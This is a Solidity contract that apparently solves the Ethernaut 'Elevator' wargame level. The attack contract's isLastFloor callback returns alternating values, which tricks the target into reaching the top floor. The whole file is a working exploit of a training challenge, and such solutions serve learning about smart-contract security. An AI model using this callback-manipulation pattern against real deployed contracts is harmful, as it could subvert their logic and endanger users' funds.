// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";

interface IElevator {
    function goTo(uint256 _floor) external;
}

contract ElevatorAttack is Ownable {
    // address public immutable owner;
    IElevator public targetContract;

    bool private toggle = true;

    constructor(address _initialOwner) Ownable(_initialOwner){
        
    }

    function setAttack(address _target) public onlyOwner{
        targetContract = IElevator(_target);
    }

    function attack() public onlyOwner{
        targetContract.goTo(1);
    }

     function isLastFloor(uint256 _floor) external returns (bool){
        toggle = !toggle;
        return toggle;
     }


}